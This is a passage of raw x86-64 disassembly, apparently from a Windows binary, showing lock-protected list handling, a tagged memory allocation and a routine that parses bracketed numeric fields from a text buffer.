   14000572f:	48 8d 35 1a af 00 00 	lea    0xaf1a(%rip),%rsi        # 0x140010650
   140005736:	eb 2a                	jmp    0x140005762
   140005738:	48 85 db             	test   %rbx,%rbx
   14000573b:	74 2a                	je     0x140005767
   14000573d:	01 7b 1c             	add    %edi,0x1c(%rbx)
   140005740:	8b 43 1c             	mov    0x1c(%rbx),%eax
   140005743:	3b 43 18             	cmp    0x18(%rbx),%eax
   140005746:	72 17                	jb     0x14000575f
   140005748:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000574c:	ff 15 16 2c 00 00    	call   *0x2c16(%rip)        # 0x140008368
   140005752:	84 c0                	test   %al,%al
   140005754:	74 06                	je     0x14000575c
   140005756:	83 63 1c 00          	andl   $0x0,0x1c(%rbx)
   14000575a:	eb 03                	jmp    0x14000575f
   14000575c:	29 7b 1c             	sub    %edi,0x1c(%rbx)
   14000575f:	48 8b 1b             	mov    (%rbx),%rbx
   140005762:	48 3b de             	cmp    %rsi,%rbx
   140005765:	75 d1                	jne    0x140005738
   140005767:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000576c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005771:	48 83 c4 20          	add    $0x20,%rsp
   140005775:	5f                   	pop    %rdi
   140005776:	c3                   	ret
   140005777:	cc                   	int3
   140005778:	40 53                	rex push %rbx
   14000577a:	48 83 ec 20          	sub    $0x20,%rsp
   14000577e:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140005784:	32 db                	xor    %bl,%bl
   140005786:	38 1d f4 b2 00 00    	cmp    %bl,0xb2f4(%rip)        # 0x140010a80
   14000578c:	75 04                	jne    0x140005792
   14000578e:	32 c0                	xor    %al,%al
   140005790:	eb 4d                	jmp    0x1400057df
   140005792:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005797:	48 8d 15 42 21 00 00 	lea    0x2142(%rip),%rdx        # 0x1400078e0
   14000579e:	48 8d 0d db b4 00 00 	lea    0xb4db(%rip),%rcx        # 0x140010c80
   1400057a5:	e8 e6 14 00 00       	call   0x140006c90
   1400057aa:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400057af:	85 c0                	test   %eax,%eax
   1400057b1:	78 1d                	js     0x1400057d0
   1400057b3:	48 85 c9             	test   %rcx,%rcx
   1400057b6:	74 25                	je     0x1400057dd
   1400057b8:	48 8d 41 0c          	lea    0xc(%rcx),%rax
   1400057bc:	48 85 c0             	test   %rax,%rax
   1400057bf:	74 0f                	je     0x1400057d0
   1400057c1:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   1400057c5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400057ca:	0f b6 db             	movzbl %bl,%ebx
   1400057cd:	0f 45 d8             	cmovne %eax,%ebx
   1400057d0:	48 85 c9             	test   %rcx,%rcx
   1400057d3:	74 08                	je     0x1400057dd
   1400057d5:	33 d2                	xor    %edx,%edx
   1400057d7:	ff 15 2b 2b 00 00    	call   *0x2b2b(%rip)        # 0x140008308
   1400057dd:	8a c3                	mov    %bl,%al
   1400057df:	48 83 c4 20          	add    $0x20,%rsp
   1400057e3:	5b                   	pop    %rbx
   1400057e4:	c3                   	ret
   1400057e5:	cc                   	int3
   1400057e6:	cc                   	int3
   1400057e7:	cc                   	int3
   1400057e8:	40 53                	rex push %rbx
   1400057ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400057ee:	48 8d 0d c3 ca 00 00 	lea    0xcac3(%rip),%rcx        # 0x1400122b8
   1400057f5:	ff 15 3d 2a 00 00    	call   *0x2a3d(%rip)        # 0x140008238
   1400057fb:	48 8d 0d a6 ca 00 00 	lea    0xcaa6(%rip),%rcx        # 0x1400122a8
   140005802:	8a d8                	mov    %al,%bl
   140005804:	e8 03 de ff ff       	call   0x14000360c
   140005809:	8a d3                	mov    %bl,%dl
   14000580b:	48 8d 0d a6 ca 00 00 	lea    0xcaa6(%rip),%rcx        # 0x1400122b8
   140005812:	ff 15 28 2a 00 00    	call   *0x2a28(%rip)        # 0x140008240
   140005818:	48 8b 0d 41 ae 00 00 	mov    0xae41(%rip),%rcx        # 0x140010660
   14000581f:	bb 57 45 4e 45       	mov    $0x454e4557,%ebx
   140005824:	48 85 c9             	test   %rcx,%rcx
   140005827:	74 08                	je     0x140005831
   140005829:	8b d3                	mov    %ebx,%edx
   14000582b:	ff 15 d7 2a 00 00    	call   *0x2ad7(%rip)        # 0x140008308
   140005831:	48 8b 0d 30 ae 00 00 	mov    0xae30(%rip),%rcx        # 0x140010668
   140005838:	48 85 c9             	test   %rcx,%rcx
   14000583b:	74 08                	je     0x140005845
   14000583d:	8b d3                	mov    %ebx,%edx
   14000583f:	ff 15 c3 2a 00 00    	call   *0x2ac3(%rip)        # 0x140008308
   140005845:	48 83 c4 20          	add    $0x20,%rsp
   140005849:	5b                   	pop    %rbx
   14000584a:	c3                   	ret
   14000584b:	cc                   	int3
   14000584c:	40 53                	rex push %rbx
   14000584e:	48 83 ec 30          	sub    $0x30,%rsp
   140005852:	33 c9                	xor    %ecx,%ecx
   140005854:	b8 01 00 00 00       	mov    $0x1,%eax
   140005859:	0f a2                	cpuid
   14000585b:	44 8b c2             	mov    %edx,%r8d
   14000585e:	48 8d 0d 1b c0 00 00 	lea    0xc01b(%rip),%rcx        # 0x140011880
   140005865:	48 8d 15 e4 1f 00 00 	lea    0x1fe4(%rip),%rdx        # 0x140007850
   14000586c:	44 8b c8             	mov    %eax,%r9d
   14000586f:	48 83 c4 30          	add    $0x30,%rsp
   140005873:	5b                   	pop    %rbx
   140005874:	e9 69 17 00 00       	jmp    0x140006fe2
   140005879:	cc                   	int3
   14000587a:	cc                   	int3
   14000587b:	cc                   	int3
   14000587c:	83 f9 04             	cmp    $0x4,%ecx
   14000587f:	77 12                	ja     0x140005893
   140005881:	48 63 c1             	movslq %ecx,%rax
   140005884:	48 8d 0d 15 c0 00 00 	lea    0xc015(%rip),%rcx        # 0x1400118a0
   14000588b:	48 c1 e0 09          	shl    $0x9,%rax
   14000588f:	48 03 c1             	add    %rcx,%rax
   140005892:	c3                   	ret
   140005893:	33 c0                	xor    %eax,%eax
   140005895:	c3                   	ret
   140005896:	cc                   	int3
   140005897:	cc                   	int3
   140005898:	40 53                	rex push %rbx
   14000589a:	48 83 ec 20          	sub    $0x20,%rsp
   14000589e:	48 8b d9             	mov    %rcx,%rbx
   1400058a1:	e8 a6 ff ff ff       	call   0x14000584c
   1400058a6:	48 8d 0d fb c9 00 00 	lea    0xc9fb(%rip),%rcx        # 0x1400122a8
   1400058ad:	e8 ae dd ff ff       	call   0x140003660
   1400058b2:	48 89 1d e7 c9 00 00 	mov    %rbx,0xc9e7(%rip)        # 0x1400122a0
   1400058b9:	48 83 c4 20          	add    $0x20,%rsp
   1400058bd:	5b                   	pop    %rbx
   1400058be:	c3                   	ret
   1400058bf:	cc                   	int3
   1400058c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400058c5:	56                   	push   %rsi
   1400058c6:	57                   	push   %rdi
   1400058c7:	41 56                	push   %r14
   1400058c9:	48 83 ec 20          	sub    $0x20,%rsp
   1400058cd:	8b f1                	mov    %ecx,%esi
   1400058cf:	33 db                	xor    %ebx,%ebx
   1400058d1:	48 8d 0d e0 c9 00 00 	lea    0xc9e0(%rip),%rcx        # 0x1400122b8
   1400058d8:	8b fb                	mov    %ebx,%edi
   1400058da:	4c 8b f2             	mov    %rdx,%r14
   1400058dd:	ff 15 55 29 00 00    	call   *0x2955(%rip)        # 0x140008238
   1400058e3:	48 39 1d c6 c9 00 00 	cmp    %rbx,0xc9c6(%rip)        # 0x1400122b0
   1400058ea:	8a d0                	mov    %al,%dl
   1400058ec:	74 2d                	je     0x14000591b
   1400058ee:	48 8b 05 b3 c9 00 00 	mov    0xc9b3(%rip),%rax        # 0x1400122a8
   1400058f5:	48 85 c0             	test   %rax,%rax
   1400058f8:	74 21                	je     0x14000591b
   1400058fa:	48 8d 0d a7 c9 00 00 	lea    0xc9a7(%rip),%rcx        # 0x1400122a8
   140005901:	48 3b c1             	cmp    %rcx,%rax
   140005904:	74 15                	je     0x14000591b
   140005906:	48 85 c0             	test   %rax,%rax
   140005909:	74 10                	je     0x14000591b
   14000590b:	39 70 10             	cmp    %esi,0x10(%rax)
   14000590e:	74 05                	je     0x140005915
   140005910:	48 8b 00             	mov    (%rax),%rax
   140005913:	eb ec                	jmp    0x140005901
   140005915:	8b 58 14             	mov    0x14(%rax),%ebx
   140005918:	8b 78 18             	mov    0x18(%rax),%edi
   14000591b:	48 8d 0d 96 c9 00 00 	lea    0xc996(%rip),%rcx        # 0x1400122b8
   140005922:	ff 15 18 29 00 00    	call   *0x2918(%rip)        # 0x140008240
   140005928:	8b c3                	mov    %ebx,%eax
   14000592a:	41 89 3e             	mov    %edi,(%r14)
   14000592d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005932:	48 83 c4 20          	add    $0x20,%rsp
   140005936:	41 5e                	pop    %r14
   140005938:	5f                   	pop    %rdi
   140005939:	5e                   	pop    %rsi
   14000593a:	c3                   	ret
   14000593b:	cc                   	int3
   14000593c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005941:	57                   	push   %rdi
   140005942:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   140005949:	48 8b 05 90 47 00 00 	mov    0x4790(%rip),%rax        # 0x14000a0e0
   140005950:	48 33 c4             	xor    %rsp,%rax
   140005953:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   14000595a:	00 
   14000595b:	8b fa                	mov    %edx,%edi
   14000595d:	48 8b d9             	mov    %rcx,%rbx
   140005960:	33 d2                	xor    %edx,%edx
   140005962:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005967:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   14000596d:	e8 ce 17 00 00       	call   0x140007140
   140005972:	ba 00 02 00 00       	mov    $0x200,%edx
   140005977:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000597c:	e8 f7 c2 ff ff       	call   0x140001c78
   140005981:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140005986:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000598b:	ff 15 af 29 00 00    	call   *0x29af(%rip)        # 0x140008340
   140005991:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005996:	e8 ed c3 ff ff       	call   0x140001d88
   14000599b:	44 8b c7             	mov    %edi,%r8d
   14000599e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400059a3:	48 8b d3             	mov    %rbx,%rdx
   1400059a6:	e8 95 ca ff ff       	call   0x140002440
   1400059ab:	48 8b 8c 24 30 02 00 	mov    0x230(%rsp),%rcx
   1400059b2:	00 
   1400059b3:	48 33 cc             	xor    %rsp,%rcx
   1400059b6:	e8 75 16 00 00       	call   0x140007030
   1400059bb:	48 8b 9c 24 60 02 00 	mov    0x260(%rsp),%rbx
   1400059c2:	00 
   1400059c3:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   1400059ca:	5f                   	pop    %rdi
   1400059cb:	c3                   	ret
   1400059cc:	48 8b c4             	mov    %rsp,%rax
   1400059cf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400059d3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400059d7:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400059db:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1400059df:	41 56                	push   %r14
   1400059e1:	48 83 ec 40          	sub    $0x40,%rsp
   1400059e5:	33 f6                	xor    %esi,%esi
   1400059e7:	45 33 f6             	xor    %r14d,%r14d
   1400059ea:	48 39 35 af c8 00 00 	cmp    %rsi,0xc8af(%rip)        # 0x1400122a0
   1400059f1:	0f 84 84 01 00 00    	je     0x140005b7b
   1400059f7:	40 38 35 a2 c0 00 00 	cmp    %sil,0xc0a2(%rip)        # 0x140011aa0
   1400059fe:	0f 84 77 01 00 00    	je     0x140005b7b
   140005a04:	8d 5e 01             	lea    0x1(%rsi),%ebx
   140005a07:	38 1d 67 ac 00 00    	cmp    %bl,0xac67(%rip)        # 0x140010674
   140005a0d:	0f 84 68 01 00 00    	je     0x140005b7b
   140005a13:	41 bc 00 08 00 00    	mov    $0x800,%r12d
   140005a19:	48 8d 3d 60 b6 00 00 	lea    0xb660(%rip),%rdi        # 0x140011080
   140005a20:	33 c0                	xor    %eax,%eax
   140005a22:	48 8d 15 57 b6 00 00 	lea    0xb657(%rip),%rdx        # 0x140011080
   140005a29:	41 8b cc             	mov    %r12d,%ecx
   140005a2c:	45 8b c4             	mov    %r12d,%r8d
   140005a2f:	f3 aa                	rep stos %al,(%rdi)
   140005a31:	48 8d 0d 68 c0 00 00 	lea    0xc068(%rip),%rcx        # 0x140011aa0
   140005a38:	e8 3b ce ff ff       	call   0x140002878
   140005a3d:	84 c0                	test   %al,%al
   140005a3f:	0f 84 36 01 00 00    	je     0x140005b7b
   140005a45:	48 8b 15 bc 45 00 00 	mov    0x45bc(%rip),%rdx        # 0x14000a008
   140005a4c:	44 8d 46 1e          	lea    0x1e(%rsi),%r8d
   140005a50:	48 8d 0d 29 b6 00 00 	lea    0xb629(%rip),%rcx        # 0x140011080
   140005a57:	e8 bc 13 00 00       	call   0x140006e18
   140005a5c:	48 85 c0             	test   %rax,%rax
   140005a5f:	0f 84 16 01 00 00    	je     0x140005b7b
   140005a65:	41 8b d4             	mov    %r12d,%edx
   140005a68:	48 8d 0d 11 b6 00 00 	lea    0xb611(%rip),%rcx        # 0x140011080
   140005a6f:	e8 bc ca ff ff       	call   0x140002530
   140005a74:	48 8b f8             	mov    %rax,%rdi
   140005a77:	48 85 c0             	test   %rax,%rax
   140005a7a:	0f 84 fb 00 00 00    	je     0x140005b7b
   140005a80:	8a 00                	mov    (%rax),%al
   140005a82:	84 c0                	test   %al,%al
   140005a84:	0f 84 d3 00 00 00    	je     0x140005b5d
   140005a8a:	41 b4 2d             	mov    $0x2d,%r12b
   140005a8d:	3c 5b                	cmp    $0x5b,%al
   140005a8f:	75 58                	jne    0x140005ae9
   140005a91:	48 03 fb             	add    %rbx,%rdi
   140005a94:	33 f6                	xor    %esi,%esi
   140005a96:	45 33 f6             	xor    %r14d,%r14d
   140005a99:	8a 07                	mov    (%rdi),%al
   140005a9b:	41 3a c4             	cmp    %r12b,%al
   140005a9e:	74 26                	je     0x140005ac6
   140005aa0:	8a d0                	mov    %al,%dl
   140005aa2:	8a c2                	mov    %dl,%al
   140005aa4:	80 fa 5d             	cmp    $0x5d,%dl
   140005aa7:	74 18                	je     0x140005ac1
   140005aa9:	0f be c2             	movsbl %dl,%eax
   140005aac:	8d 34 b6             	lea    (%rsi,%rsi,4),%esi
   140005aaf:	48 03 fb             	add    %rbx,%rdi
   140005ab2:	8d 76 e8             	lea    -0x18(%rsi),%esi
   140005ab5:	8d 34 70             	lea    (%rax,%rsi,2),%esi
   140005ab8:	8a 07                	mov    (%rdi),%al
   140005aba:	8a d0                	mov    %al,%dl
   140005abc:	41 3a c4             	cmp    %r12b,%al
   140005abf:	75 e1                	jne    0x140005aa2
   140005ac1:	41 3a c4             	cmp    %r12b,%al
   140005ac4:	75 23                	jne    0x140005ae9
   140005ac6:	48 03 fb             	add    %rbx,%rdi
   140005ac9:	8a 07                	mov    (%rdi),%al
   140005acb:	3c 5d                	cmp    $0x5d,%al
   140005acd:	74 1a                	je     0x140005ae9
   140005acf:	0f be c0             	movsbl %al,%eax
   140005ad2:	47 8d 34 b6          	lea    (%r14,%r14,4),%r14d
   140005ad6:	48 03 fb             	add    %rbx,%rdi
   140005ad9:	45 8d 76 e8          	lea    -0x18(%r14),%r14d
   140005add:	46 8d 34 70          	lea    (%rax,%r14,2),%r14d
   140005ae1:	8a 07                	mov    (%rdi),%al
   140005ae3:	3c 5d                	cmp    $0x5d,%al
   140005ae5:	75 e8                	jne    0x140005acf
   140005ae7:	eb 67                	jmp    0x140005b50
   140005ae9:	3c 7b                	cmp    $0x7b,%al
   140005aeb:	75 63                	jne    0x140005b50
   140005aed:	eb 55                	jmp    0x140005b44
   140005aef:	33 c9                	xor    %ecx,%ecx
   140005af1:	eb 13                	jmp    0x140005b06
   140005af3:	3c 7d                	cmp    $0x7d,%al
   140005af5:	74 15                	je     0x140005b0c
   140005af7:	8d 0c 89             	lea    (%rcx,%rcx,4),%ecx
   140005afa:	0f be c0             	movsbl %al,%eax
   140005afd:	8d 49 e8             	lea    -0x18(%rcx),%ecx
   140005b00:	48 03 fb             	add    %rbx,%rdi
   140005b03:	8d 0c 48             	lea    (%rax,%rcx,2),%ecx
   140005b06:	8a 07                	mov    (%rdi),%al
   140005b08:	3c 7c                	cmp    $0x7c,%al
   140005b0a:	75 e7                	jne    0x140005af3
   140005b0c:	85 f6                	test   %esi,%esi
   140005b0e:	74 2f                	je     0x140005b3f
   140005b10:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005b16:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005b1b:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140005b21:	83 64 24 3c 00       	andl   $0x0,0x3c(%rsp)
   140005b26:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140005b2a:	48 8d 0d 77 c7 00 00 	lea    0xc777(%rip),%rcx        # 0x1400122a8
   140005b31:	89 74 24 34          	mov    %esi,0x34(%rsp)
   140005b35:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140005b3a:	e8 bd fa ff ff       	call   0x1400055fc
   140005b3f:	80 3f 7d             	cmpb   $0x7d,(%rdi)
   140005b42:	74 0c                	je     0x140005b50
   140005b44:	48 03 fb             	add    %rbx,%rdi
   140005b47:	80 3d 82 86 00 00 00 	cmpb   $0x0,0x8682(%rip)        # 0x14000e1d0
   140005b4e:	74 9f                	je     0x140005aef
   140005b50:	48 03 fb             	add    %rbx,%rdi
   140005b53:	8a 07                	mov    (%rdi),%al
   140005b55:	84 c0                	test   %al,%al
   140005b57:	0f 85 30 ff ff ff    	jne    0x140005a8d
   140005b5d:	80 3d 6c 86 00 00 00 	cmpb   $0x0,0x866c(%rip)        # 0x14000e1d0
   140005b64:	75 08                	jne    0x140005b6e
   140005b66:	88 1d 08 ab 00 00    	mov    %bl,0xab08(%rip)        # 0x140010674
   140005b6c:	eb 09                	jmp    0x140005b77
   140005b6e:	c6 05 ff aa 00 00 00 	movb   $0x0,0xaaff(%rip)        # 0x140010674
   140005b75:	32 db                	xor    %bl,%bl
   140005b77:	8a c3                	mov    %bl,%al
   140005b79:	eb 02                	jmp    0x140005b7d
   140005b7b:	32 c0                	xor    %al,%al
   140005b7d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140005b82:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140005b87:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140005b8c:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   140005b91:	48 83 c4 40          	add    $0x40,%rsp
   140005b95:	41 5e                	pop    %r14
   140005b97:	c3                   	ret
   140005b98:	48 8b c4             	mov    %rsp,%rax
   140005b9b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140005b9f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005ba3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005ba7:	55                   	push   %rbp
   140005ba8:	48 8d a8 a8 fe ff ff 	lea    -0x158(%rax),%rbp
   140005baf:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   140005bb6:	48 8b 05 23 45 00 00 	mov    0x4523(%rip),%rax        # 0x14000a0e0
   140005bbd:	48 33 c4             	xor    %rsp,%rax
   140005bc0:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   140005bc7:	48 8b d9             	mov    %rcx,%rbx
   140005bca:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005bcd:	33 c0                	xor    %eax,%eax
   140005bcf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005bd4:	33 d2                	xor    %edx,%edx
   140005bd6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005bdb:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140005be1:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140005be6:	e8 55 15 00 00       	call   0x140007140
   140005beb:	33 d2                	xor    %edx,%edx
   140005bed:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140005bf1:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140005bf7:	e8 44 15 00 00       	call   0x140007140
   140005bfc:	33 ff                	xor    %edi,%edi
   140005bfe:	48 39 3d 9b c6 00 00 	cmp    %rdi,0xc69b(%rip)        # 0x1400122a0
   140005c05:	0f 84 19 01 00 00    	je     0x140005d24
   140005c0b:	48 8b d3             	mov    %rbx,%rdx
   140005c0e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005c13:	e8 70 06 00 00       	call   0x140006288
   140005c18:	84 c0                	test   %al,%al
   140005c1a:	0f 85 04 01 00 00    	jne    0x140005d24
   140005c20:	40 38 7c 24 40       	cmp    %dil,0x40(%rsp)
   140005c25:	0f 84 f9 00 00 00    	je     0x140005d24
   140005c2b:	ba 00 28 00 00       	mov    $0x2800,%edx
   140005c30:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005c35:	e8 2a d9 ff ff       	call   0x140003564
   140005c3a:	84 c0                	test   %al,%al
   140005c3c:	0f 84 e2 00 00 00    	je     0x140005d24
   140005c42:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005c47:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005c4c:	e8 23 c9 ff ff       	call   0x140002574
   140005c51:	84 c0                	test   %al,%al
   140005c53:	0f 84 cb 00 00 00    	je     0x140005d24
   140005c59:	48 8b 35 a8 43 00 00 	mov    0x43a8(%rip),%rsi        # 0x14000a008
   140005c60:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005c65:	e8 9a d9 ff ff       	call   0x140003604
   140005c6a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005c6f:	48 8b d8             	mov    %rax,%rbx
   140005c72:	e8 8d d8 ff ff       	call   0x140003504
   140005c77:	48 83 fb 1e          	cmp    $0x1e,%rbx
   140005c7b:	0f 86 a3 00 00 00    	jbe    0x140005d24
   140005c81:	44 8d 47 1e          	lea    0x1e(%rdi),%r8d
   140005c85:	48 8b d6             	mov    %rsi,%rdx
   140005c88:	48 8b c8             	mov    %rax,%rcx
   140005c8b:	e8 88 11 00 00       	call   0x140006e18
   140005c90:	48 85 c0             	test   %rax,%rax
   140005c93:	0f 84 8b 00 00 00    	je     0x140005d24
   140005c99:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005c9e:	e8 61 d9 ff ff       	call   0x140003604
   140005ca3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005ca8:	48 8b d8             	mov    %rax,%rbx
   140005cab:	e8 54 d8 ff ff       	call   0x140003504
   140005cb0:	48 8b c8             	mov    %rax,%rcx
   140005cb3:	48 8b d3             	mov    %rbx,%rdx
   140005cb6:	e8 75 c8 ff ff       	call   0x140002530
   140005cbb:	48 8b f0             	mov    %rax,%rsi
   140005cbe:	48 85 c0             	test   %rax,%rax
   140005cc1:	74 61                	je     0x140005d24
   140005cc3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005cc8:	e8 37 d9 ff ff       	call   0x140003604
   140005ccd:	48 8b d8             	mov    %rax,%rbx
   140005cd0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005cd5:	2b de                	sub    %esi,%ebx
   140005cd7:	e8 28 d8 ff ff       	call   0x140003504
   140005cdc:	4c 8d 45 40          	lea    0x40(%rbp),%r8
   140005ce0:	48 8b ce             	mov    %rsi,%rcx
   140005ce3:	8d 14 03             	lea    (%rbx,%rax,1),%edx
   140005ce6:	e8 d9 df ff ff       	call   0x140003cc4
   140005ceb:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140005cef:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140005cf4:	e8 8f 05 00 00       	call   0x140006288
   140005cf9:	3c 01                	cmp    $0x1,%al
   140005cfb:	75 27                	jne    0x140005d24
   140005cfd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005d02:	e8 fd d8 ff ff       	call   0x140003604
   140005d07:	48 8b d8             	mov    %rax,%rbx
   140005d0a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005d0f:	2b de                	sub    %esi,%ebx
   140005d11:	e8 ee d7 ff ff       	call   0x140003504
   140005d16:	48 8b ce             	mov    %rsi,%rcx
   140005d19:	8d 14 03             	lea    (%rbx,%rax,1),%edx
   140005d1c:	e8 1b fc ff ff       	call   0x14000593c
   140005d21:	40 b7 01             	mov    $0x1,%dil
   140005d24:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005d29:	e8 06 d8 ff ff       	call   0x140003534
   140005d2e:	40 8a c7             	mov    %dil,%al
   140005d31:	48 8b 8d 40 01 00 00 	mov    0x140(%rbp),%rcx
   140005d38:	48 33 cc             	xor    %rsp,%rcx
   140005d3b:	e8 f0 12 00 00       	call   0x140007030
   140005d40:	4c 8d 9c 24 50 02 00 	lea    0x250(%rsp),%r11
   140005d47:	00 
   140005d48:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140005d4c:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140005d50:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140005d54:	49 8b e3             	mov    %r11,%rsp
   140005d57:	5d                   	pop    %rbp
   140005d58:	c3                   	ret
   140005d59:	cc                   	int3
   140005d5a:	cc                   	int3
   140005d5b:	cc                   	int3
   140005d5c:	48 8b c4             	mov    %rsp,%rax
   140005d5f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005d63:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140005d67:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140005d6b:	4c 89 68 20          	mov    %r13,0x20(%rax)
   140005d6f:	41 57                	push   %r15
   140005d71:	48 83 ec 30          	sub    $0x30,%rsp
   140005d75:	83 60 ec 00          	andl   $0x0,-0x14(%rax)
   140005d79:	33 f6                	xor    %esi,%esi
   140005d7b:	48 8b 05 de a8 00 00 	mov    0xa8de(%rip),%rax        # 0x140010660
   140005d82:	41 bf 00 00 02 00    	mov    $0x20000,%r15d
   140005d88:	48 85 c0             	test   %rax,%rax
   140005d8b:	75 22                	jne    0x140005daf
   140005d8d:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   140005d93:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140005d96:	41 8b d7             	mov    %r15d,%edx
   140005d99:	ff 15 71 25 00 00    	call   *0x2571(%rip)        # 0x140008310
   140005d9f:	48 89 05 ba a8 00 00 	mov    %rax,0xa8ba(%rip)        # 0x140010660
   140005da6:	48 85 c0             	test   %rax,%rax
   140005da9:	0f 84 bc 02 00 00    	je     0x14000606b
   140005daf:	40 38 35 ca ac 00 00 	cmp    %sil,0xacca(%rip)        # 0x140010a80
   140005db6:	0f 85 af 02 00 00    	jne    0x14000606b
   140005dbc:	48 39 35 a5 a8 00 00 	cmp    %rsi,0xa8a5(%rip)        # 0x140010668
   140005dc3:	0f 85 a2 02 00 00    	jne    0x14000606b
   140005dc9:	48 39 35 a8 a8 00 00 	cmp    %rsi,0xa8a8(%rip)        # 0x140010678
   140005dd0:	0f 85 95 02 00 00    	jne    0x14000606b
   140005dd6:	40 38 35 c3 c0 00 00 	cmp    %sil,0xc0c3(%rip)        # 0x140011ea0
   140005ddd:	0f 84 88 02 00 00    	je     0x14000606b
   140005de3:	48 8b f8             	mov    %rax,%rdi
   140005de6:	4c 8d 2d 93 ac 00 00 	lea    0xac93(%rip),%r13        # 0x140010a80
   140005ded:	33 c0                	xor    %eax,%eax
   140005def:	49 8b cf             	mov    %r15,%rcx
   140005df2:	f3 aa                	rep stos %al,(%rdi)
   140005df4:	48 8b 15 65 a8 00 00 	mov    0xa865(%rip),%rdx        # 0x140010660
   140005dfb:	49 8b fd             	mov    %r13,%rdi
   140005dfe:	b9 00 02 00 00       	mov    $0x200,%ecx
   140005e03:	4d 8b c7             	mov    %r15,%r8
   140005e06:	f3 aa                	rep stos %al,(%rdi)
   140005e08:	48 8d 0d 91 c0 00 00 	lea    0xc091(%rip),%rcx        # 0x140011ea0
   140005e0f:	e8 64 ca ff ff       	call   0x140002878
   140005e14:	84 c0                	test   %al,%al
   140005e16:	0f 84 4f 02 00 00    	je     0x14000606b
   140005e1c:	48 8b 15 e5 41 00 00 	mov    0x41e5(%rip),%rdx        # 0x14000a008
   140005e23:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140005e29:	48 8b 0d 30 a8 00 00 	mov    0xa830(%rip),%rcx        # 0x140010660
   140005e30:	e8 e3 0f 00 00       	call   0x140006e18
   140005e35:	48 85 c0             	test   %rax,%rax
   140005e38:	0f 84 2d 02 00 00    	je     0x14000606b
   140005e3e:	48 8b 0d 1b a8 00 00 	mov    0xa81b(%rip),%rcx        # 0x140010660
   140005e45:	49 8b d7             	mov    %r15,%rdx
   140005e48:	e8 e3 c6 ff ff       	call   0x140002530
   140005e4d:	48 85 c0             	test   %rax,%rax
   140005e50:	0f 84 15 02 00 00    	je     0x14000606b
   140005e56:	45 8b c7             	mov    %r15d,%r8d
   140005e59:	48 8d 15 00 1a 00 00 	lea    0x1a00(%rip),%rdx        # 0x140007860
   140005e60:	48 8b c8             	mov    %rax,%rcx
